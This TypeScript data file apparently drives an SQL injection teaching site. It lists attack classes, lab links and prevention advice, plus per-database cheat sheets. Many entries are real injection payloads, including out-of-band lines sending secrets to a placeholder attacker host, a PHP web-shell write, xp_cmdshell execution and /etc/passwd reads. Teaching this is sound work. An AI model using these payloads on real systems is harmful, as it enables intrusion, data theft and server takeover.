export interface AttackPayload {
  label: string;
  sql: string;
}

export interface AttackClass {
  id: string;
  name: string;
  aka: string;
  summary: string;
  signals: string[];
  impact: string;
  payloads: AttackPayload[];
  labs: string[];
}

export const ATTACK_CLASSES: AttackClass[] = [
  {
    id: 'in-band',
    name: 'In-band (error-based)',
    aka: 'Classic · Error-based',
    summary:
      'The database response — or the driver error — comes straight back to you. You can see the shape of the query and often the data itself. The fastest class to exploit and the easiest to miss, because a 500 page is usually treated as a bug rather than a vulnerability.',
    signals: ['Input in the URL, a form, or a header', 'A quote produces a syntax error', 'Database dialect leaks in an error page'],
    impact: 'Full read of every table the application user can reach; sometimes write.',
    payloads: [
      { label: 'Break the literal', sql: `'` },
      { label: 'Always-true predicate', sql: `' OR 1=1--` },
      { label: 'MySQL data-in-error', sql: `' AND extractvalue(1,concat(0x7e,(SELECT value FROM secrets)))--` },
      { label: 'PostgreSQL data-in-error', sql: `' AND 1=CAST((SELECT value FROM secrets) AS int)--` },
      { label: 'MSSQL data-in-error', sql: `' AND 1=CONVERT(int,(SELECT TOP 1 value FROM secrets))--` },
      { label: 'Oracle data-in-error', sql: `' AND 1=UTL_INADDR.get_host_name((SELECT value FROM secrets))--` },
    ],
    labs: ['error-disclosure', 'login-bypass'],
  },
  {
    id: 'union',
    name: 'UNION-based',
    aka: 'In-band data extraction',
    summary:
      'Append a second SELECT to the original statement so the page renders attacker-chosen rows. Requires the column count and compatible types — both recoverable in a handful of requests. The single most productive technique when the application echoes query output.',
    signals: ['Query results are rendered in the page', 'Errors show column counts or type mismatches'],
    impact: 'Read of arbitrary tables in a single request, including credentials and secrets.',
    payloads: [
      { label: 'Column count probe', sql: `' ORDER BY 1--` },
      { label: 'SQLite column count from error', sql: `' ORDER BY 99--  →  "ORDER BY term out of range - should be between 1 and 3"` },
      { label: 'Union with padding', sql: `' UNION SELECT 1,2,3--` },
      { label: 'Dump another table', sql: `' UNION SELECT 0,username,password FROM users--` },
      { label: 'One column, every row', sql: `' UNION SELECT 1,group_concat(name||'='||value),3 FROM secrets--` },
      { label: 'Schema first', sql: `' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--` },
    ],
    labs: ['union-columns', 'union-multirow', 'union-schema'],
  },
  {
    id: 'boolean',
    name: 'Boolean-based blind',
    aka: 'Inferential',
    summary:
      'No data is returned. The application simply behaves differently when a condition is true: a row appears, a message changes, a redirect happens, a 200 becomes a 500. Each difference is one bit, and one bit per request is enough to read a whole database.',
    signals: ['Same page, different content or status', 'No output reflection', 'Injectable parameter still alters behaviour'],
    impact: 'Full read, slowly — typically a few hundred requests per secret.',
    payloads: [
      { label: 'True / false probe', sql: `' AND 1=1--   /   ' AND 1=2--` },
      { label: 'Character test', sql: `' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='F'--` },
      { label: 'Binary search', sql: `' OR (SELECT unicode(substr(password,2,1)) FROM users)>77--` },
      { label: 'Length first', sql: `' OR (SELECT length(password) FROM users WHERE username='admin')>20--` },
      { label: 'Existence test', sql: `' OR (SELECT count(*) FROM sqlite_master WHERE name='secrets')=1--` },
    ],
    labs: ['blind-boolean', 'reset-token-blind', 'order-by'],
  },
  {
    id: 'time',
    name: 'Time-based blind',
    aka: 'Inferential, timing',
    summary:
      'The response is byte-identical in every case. The only remaining channel is how long the database takes, so the injected condition gates a delay. Noisy, slow, and works in places where nothing else does — including fully post-processed responses and cached-looking pages.',
    signals: ['Identical responses for all inputs', 'No errors surfaced', 'A parameter that reaches a numeric or boolean context'],
    impact: 'Full read at ~1 request per bit, plus a denial-of-service risk if delays are abused.',
    payloads: [
      { label: 'MySQL', sql: `' AND IF((SELECT substr(value,1,1) FROM secrets)='F',SLEEP(5),0)--` },
      { label: 'PostgreSQL', sql: `' AND CASE WHEN (SELECT substr(value,1,1) FROM secrets)='F' THEN pg_sleep(5) ELSE pg_sleep(0) END--` },
      { label: 'MSSQL', sql: `'; IF (SELECT substr(value,1,1) FROM secrets)='F' WAITFOR DELAY '0:0:5'--` },
      { label: 'Oracle', sql: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` },
      { label: 'SQLite (this site)', sql: `' OR (CASE WHEN 1=1 THEN sleep(2) ELSE 0 END)--` },
    ],
    labs: ['blind-time'],
  },
  {
    id: 'oob',
    name: 'Out-of-band (OOB)',
    aka: 'OAST',
    summary:
      'The application returns nothing useful, shows no errors, and has no timing signal. So you make the database talk to a server you control, carrying the data in a DNS query or HTTP request. Requires a listener plus a network-permitted egress path from the database host.',
    signals: ['Blind endpoint, but the DB host can reach the internet', 'Stacked queries or a network-capable function available'],
    impact: 'Fast, reliable exfiltration over a channel the application cannot sanitise.',
    payloads: [
      { label: 'MSSQL DNS exfil', sql: `'; EXEC master..xp_dirtree '\\\\'+(SELECT value FROM secrets)+'.attacker.tld\\a'--` },
      { label: 'Oracle HTTP exfil', sql: `' AND UTL_HTTP.request('http://attacker.tld/'||(SELECT value FROM secrets))=1--` },
      { label: 'MySQL Windows UNC', sql: `' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT value FROM secrets),'.attacker.tld\\\\a'))--` },
      { label: 'PostgreSQL COPY TO PROGRAM', sql: `'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.tld/$(hostname)'--` },
    ],
    labs: [],
  },
  {
    id: 'second-order',
    name: 'Second-order (stored)',
    aka: 'Persistent injection',
    summary:
      'The payload is stored safely and executes somewhere else later: an admin panel, a batch job, a report generator, another service. The source and the sink are different requests, which is exactly why input-only scanners and WAFs miss it.',
    signals: ['A value is stored then re-displayed or re-used', 'Admin tooling builds queries from stored names', 'Escaping happens on input, not at the sink'],
    impact: 'Anything a first-order injection can do, often with higher privileges at the sink.',
    payloads: [
      { label: 'Stored username', sql: `admin'--` },
      { label: 'Stored in a profile field', sql: `' , role='admin' WHERE 1=1--` },
      { label: 'Stored in a filename', sql: `x' OR 1=1-- .pdf` },
      { label: 'Payload fires here', sql: `UPDATE users SET password='…' WHERE username='admin'--'` },
    ],
    labs: ['second-order'],
  },
  {
    id: 'stacked',
    name: 'Stacked queries',
    aka: 'Bathed / multi-statement',
    summary:
      'The driver executes more than one statement per call, so you terminate the original query and write your own. Turns a read primitive into a write primitive, and on MSSQL/PostgreSQL it is often the road to file system access and command execution.',
    signals: ['Semicolons are not rejected', 'PHP mysqli_multi_query, PDO with emulation off, MSSQL, PostgreSQL, SQLite'],
    impact: 'INSERT/UPDATE/DELETE, privilege escalation, file write, RCE depending on the DB role.',
    payloads: [
      { label: 'Privilege escalation', sql: `1; UPDATE users SET role='admin' WHERE username='jdoe'` },
      { label: 'Create an account', sql: `1; INSERT INTO users (username,password,role) VALUES ('x','x','admin')` },
      { label: 'MSSQL command execution', sql: `1; EXEC xp_cmdshell 'whoami'` },
      { label: 'MySQL file write', sql: `1; SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/shell.php'` },
      { label: 'PostgreSQL file write', sql: `1; COPY (SELECT 'data') TO '/tmp/out.txt'` },
    ],
    labs: ['stacked-queries'],
  },
  {
    id: 'identifier',
    name: 'Identifier & clause injection',
    aka: 'ORDER BY, LIMIT, GROUP BY, table names',
    summary:
      'Identifiers cannot be parameterised, so developers concatenate them and call it unavoidable. ORDER BY, LIMIT/OFFSET, GROUP BY, column lists and table names are all injectable expression slots — and ORDER BY is often blind, readable only through row ordering.',
    signals: ['A sort/filter/pagination parameter shaped like a column name', 'A "safe" integer limit that still errors on a quote'],
    impact: 'Blind or in-band read; occasionally UNION if the slot accepts a subquery.',
    payloads: [
      { label: 'Boolean via ordering', sql: `(CASE WHEN (SELECT substr(value,1,1) FROM secrets)='F' THEN price ELSE price*-1 END)` },
      { label: 'Subquery in ORDER BY', sql: `(SELECT value FROM secrets)` },
      { label: 'LIMIT injection (MySQL)', sql: `1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT value FROM secrets))),1)` },
      { label: 'Table name slot', sql: `users UNION SELECT value,2 FROM secrets` },
    ],
    labs: ['order-by'],
  },
  {
    id: 'write-sink',
    name: 'Write sinks (INSERT / UPDATE / DELETE)',
    aka: 'Non-echoing endpoints',
    summary:
      'Endpoints that only write are frequently excluded from testing because they return no rows. They are still injectable, and the payload can read from anywhere — you make the database write stolen data into a table you can see.',
    signals: ['Forms that insert logs, reports, comments, analytics events', 'Bulk import endpoints', 'Audit trails storing raw headers'],
    impact: 'Data exfiltration via a second table, data tampering, integrity loss, sometimes destructive DELETE.',
    payloads: [
      { label: 'Extra tuple', sql: `x'),((SELECT value FROM secrets),'info')--` },
      { label: 'Shift columns', sql: `x','critical'),(('admin')--` },
      { label: 'UPDATE tampering', sql: `x' , role='admin' WHERE username='jdoe'--` },
      { label: 'Subquery in a value', sql: `'||(SELECT value FROM secrets)||'` },
    ],
    labs: ['log-ingest-insert'],
  },
  {
    id: 'headers',
    name: 'Header, cookie & JSON injection',
    aka: 'Second-channel injection',
    summary:
      'Not every parameter is a query string. Cookies, User-Agent, X-Forwarded-For, Referer, Accept-Language, custom headers and JSON bodies all end up in logs, session lookups and analytics tables. Frameworks rarely validate them because teams treat them as server-set.',
    signals: ['Sessions stored in SQL', 'Audit or analytics logging of request metadata', 'Custom headers used for tenant or user lookup'],
    impact: 'Session forgery, authentication bypass, persistent injection through log storage.',
    payloads: [
      { label: 'Cookie session lookup', sql: `x' UNION SELECT 'attacker','admin'--` },
      { label: 'User-Agent into a log', sql: `Mozilla/5.0',(SELECT value FROM secrets))--` },
      { label: 'X-Forwarded-For', sql: `1.2.3.4' OR 1=1--` },
      { label: 'JSON body', sql: `{"username":"' UNION SELECT 0,'x','admin',(SELECT value FROM secrets)--"}` },
    ],
    labs: ['session-cookie', 'api-json-login'],
  },
  {
    id: 'waf',
    name: 'Filter & WAF bypass',
    aka: 'Evasion',
    summary:
      'Blacklists and regex filters are the default "fix" and they fail predictably. SQL is case-insensitive, comments are whitespace, strings can be built from character codes, and equivalent syntax is effectively infinite. Every filter bypass here is a real technique against real filters.',
    signals: ['Your payload comes back with words removed', 'A 403 appears only for certain keywords', 'Input length or character limits'],
    impact: 'Full exploitation despite the control; the filter only slows you down.',
    payloads: [
      { label: 'Case', sql: `UnIoN SeLeCt` },
      { label: 'Comment whitespace', sql: `UNION/**/SELECT/**/1,2,3` },
      { label: 'Tabs and newlines', sql: `UNION%09SELECT%0A1,2,3` },
      { label: 'Recursive stripping', sql: `ununionion seselectlect` },
      { label: 'No quotes', sql: `UNION SELECT 1,char(70,76,65,71),3` },
      { label: 'Keyword alternatives', sql: `|| instead of OR · IN instead of = · HAVING instead of WHERE · EXCEPT/INTERSECT` },
    ],
    labs: ['waf-case', 'waf-spaces', 'waf-quotes', 'waf-recursive'],
  },
  {
    id: 'impact',
    name: 'What injection actually costs',
    aka: 'Exploitation & impact',
    summary:
      'SQL injection is rarely the end state. It is the pivot. The impact ladder runs from data disclosure to complete host compromise, and the escalation path depends mostly on the privileges of the database account the application uses.',
    signals: ['Any confirmed injection'],
    impact: 'See ladder below.',
    payloads: [
      { label: 'Auth bypass', sql: `admin'--  →  log in as anyone` },
      { label: 'Data theft', sql: `UNION SELECT … FROM payments` },
      { label: 'Data tampering', sql: `; UPDATE orders SET total=0` },
      { label: 'File read (MySQL)', sql: `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--` },
      { label: 'File write → RCE', sql: `' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/s.php'--` },
      { label: 'Command execution (MSSQL)', sql: `'; EXEC xp_cmdshell 'powershell -enc …'--` },
      { label: 'Persistence', sql: `; CREATE TRIGGER t AFTER INSERT ON users BEGIN … END` },
    ],
    labs: ['ecommerce-search', 'support-tickets'],
  },
  {
    id: 'prevention',
    name: 'Prevention that actually works',
    aka: 'Defence',
    summary:
      'Escape hatches and WAFs are compensating controls. The only structural fix is to keep code and data on separate channels — then reduce the blast radius so a mistake is not a breach.',
    signals: [],
    impact: 'Eliminates the class rather than the payload.',
    payloads: [
      { label: 'Parameterise — the fix', sql: `cursor.execute("SELECT * FROM users WHERE id = ?", [user_id])` },
      { label: 'Allow-list identifiers', sql: `sort = {'price':'price','name':'name'}.get(param, 'id')` },
      { label: 'Least privilege', sql: `GRANT SELECT ON products TO web;  -- no access to payments` },
      { label: 'Separate schemas', sql: `search replica has no grants on auth/payments tables` },
      { label: 'Defence in depth', sql: `WAF + error suppression + query timeouts + monitoring for anomalous SQL` },
    ],
    labs: [],
  },
];

export interface CheatRow {
  goal: string;
  payload: string;
}

export interface CheatSheet {
  dbms: string;
  rows: CheatRow[];
}

export const CHEAT_SHEETS: CheatSheet[] = [
  {
    dbms: 'SQLite',
    rows: [
      { goal: 'Comment', payload: `--` },
      { goal: 'Concatenate', payload: `'a' || 'b'` },
      { goal: 'Version', payload: `SELECT sqlite_version()` },
      { goal: 'Current user', payload: `n/a — file-based, no users` },
      { goal: 'List tables', payload: `SELECT name FROM sqlite_master WHERE type='table'` },
      { goal: 'List columns', payload: `SELECT name FROM pragma_table_info('users')` },
      { goal: 'First N rows', payload: `LIMIT 5 OFFSET 0` },
      { goal: 'Aggregate rows', payload: `group_concat(name || '=' || value, ' | ')` },
      { goal: 'Delay', payload: `no native sleep — heavy query or a custom UDF` },
      { goal: 'Stacked queries', payload: `supported by most drivers, including this site` },
      { goal: 'File access', payload: `ATTACH DATABASE '/path/x.db' AS x` },
    ],
  },
  {
    dbms: 'MySQL / MariaDB',
    rows: [
      { goal: 'Comment', payload: `-- \` (space required) or \`#\` or \`-- -` },
      { goal: 'Concatenate', payload: `CONCAT('a','b')` },
      { goal: 'Version', payload: `@@version` },
      { goal: 'Current user', payload: `current_user()` },
      { goal: 'List tables', payload: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` },
      { goal: 'List columns', payload: `SELECT column_name FROM information_schema.columns WHERE table_name='users'` },
      { goal: 'First N rows', payload: `LIMIT 5 OFFSET 0` },
      { goal: 'Aggregate rows', payload: `GROUP_CONCAT(name,'=',value SEPARATOR ' | ')` },
      { goal: 'Delay', payload: `SLEEP(5)\` / \`BENCHMARK(10000000,MD5(1))` },
      { goal: 'Error-based', payload: `extractvalue(1,concat(0x7e,(SELECT …)))\` / \`updatexml(1,concat(0x7e,(SELECT …)),1)` },
      { goal: 'File read / write', payload: `LOAD_FILE('/etc/passwd')\` / \`INTO OUTFILE '/var/www/s.php'` },
      { goal: 'Stacked queries', payload: `only via multi-statement drivers` },
    ],
  },
  {
    dbms: 'PostgreSQL',
    rows: [
      { goal: 'Comment', payload: `--` },
      { goal: 'Concatenate', payload: `'a' || 'b'` },
      { goal: 'Version', payload: `version()` },
      { goal: 'Current user', payload: `current_user` },
      { goal: 'List tables', payload: `SELECT table_name FROM information_schema.tables WHERE table_schema='public'` },
      { goal: 'List columns', payload: `SELECT column_name FROM information_schema.columns WHERE table_name='users'` },
      { goal: 'First N rows', payload: `LIMIT 5 OFFSET 0` },
      { goal: 'Aggregate rows', payload: `string_agg(name || '=' || value, ' | ')` },
      { goal: 'Delay', payload: `pg_sleep(5)` },
      { goal: 'Error-based', payload: `1=CAST((SELECT value FROM secrets) AS int)` },
      { goal: 'File read / write', payload: `pg_read_file('/etc/passwd')\` / \`COPY … TO PROGRAM 'cmd'` },
      { goal: 'Stacked queries', payload: `supported` },
    ],
  },
  {
    dbms: 'MSSQL',
    rows: [
      { goal: 'Comment', payload: `--` },
      { goal: 'Concatenate', payload: `'a' + 'b'` },
      { goal: 'Version', payload: `@@version` },
      { goal: 'Current user', payload: `SYSTEM_USER\` / \`USER_NAME()` },
      { goal: 'List tables', payload: `SELECT name FROM sys.objects WHERE type='U'` },
      { goal: 'List columns', payload: `SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')` },
      { goal: 'First N rows', payload: `SELECT TOP 5 …\` / \`OFFSET 0 ROWS FETCH NEXT 5 ROWS ONLY` },
      { goal: 'Aggregate rows', payload: `STRING_AGG(name,' | ')\` (2017+) or \`FOR XML PATH` },
      { goal: 'Delay', payload: `WAITFOR DELAY '0:0:5'` },
      { goal: 'Error-based', payload: `1=CONVERT(int,(SELECT TOP 1 value FROM secrets))` },
      { goal: 'Out-of-band', payload: `EXEC master..xp_dirtree '\\\\attacker.tld\\a'` },
      { goal: 'Command execution', payload: `EXEC xp_cmdshell 'whoami'` },
      { goal: 'Stacked queries', payload: `supported` },
    ],
  },
  {
    dbms: 'Oracle',
    rows: [
      { goal: 'Comment', payload: `--` },
      { goal: 'Concatenate', payload: `'a' || 'b'` },
      { goal: 'Version', payload: `SELECT banner FROM v$version` },
      { goal: 'Current user', payload: `SELECT user FROM dual` },
      { goal: 'List tables', payload: `SELECT table_name FROM all_tables` },
      { goal: 'List columns', payload: `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` },
      { goal: 'First N rows', payload: `WHERE ROWNUM <= 5\` / \`FETCH FIRST 5 ROWS ONLY` },
      { goal: 'Aggregate rows', payload: `LISTAGG(name,' | ') WITHIN GROUP (ORDER BY name)` },
      { goal: 'Delay', payload: `DBMS_LOCK.SLEEP(5)\` / \`DBMS_PIPE.RECEIVE_MESSAGE('a',5)` },
      { goal: 'Error-based', payload: `1=UTL_INADDR.get_host_name((SELECT value FROM secrets))` },
      { goal: 'Note', payload: `SELECT needs FROM dual` },
      { goal: 'Stacked queries', payload: `not supported in most drivers` },
    ],
  },
];
